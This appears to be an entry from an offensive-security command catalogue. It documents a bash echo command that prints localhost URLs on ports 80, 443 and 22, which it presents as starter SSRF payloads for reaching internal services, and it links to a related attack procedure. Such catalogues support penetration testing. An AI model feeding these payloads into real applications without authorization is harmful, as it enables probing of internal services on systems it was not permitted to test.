---
id: f37e98f9-823a-45fc-99fe-2f975a8abd90
name: generate-localhost-urls-for-ssrf
type: command
executor: bash
data: 'echo -e "http://localhost:80\nhttp://localhost:443\nhttp://localhost:22"'
output: null
created_at: '2023-04-06T03:56:37.204568+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - macOS
tags:
  - ssrf
  - payload-generation
verified: true
validated: true
---

# generate-localhost-urls-for-ssrf

## Command

```bash
echo -e "http://localhost:80\nhttp://localhost:443\nhttp://localhost:22"
```

## Description

This command generates a simple list of SSRF payloads using the 'localhost' hostname targeting common ports. It is used in the initial step of crafting localhost-focused SSRF attacks to access internal services.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-e` | Enable interpretation of backslash escapes for newlines | Yes |

## Examples

### Basic Usage

```bash
echo -e "http://localhost:80\nhttp://localhost:443\nhttp://localhost:22"
```

### Save to File

```bash
echo -e "http://localhost:80\nhttp://localhost:443\nhttp://localhost:22" > ssrf_payloads.txt
```

## Expected Output

http://localhost:80
http://localhost:443
http://localhost:22

A plain text list of URLs that can be copied or piped for use in testing.

## Related

- [[procedures/Craft-Localhost-SSRF-Payloads-for-Internal-Access]]
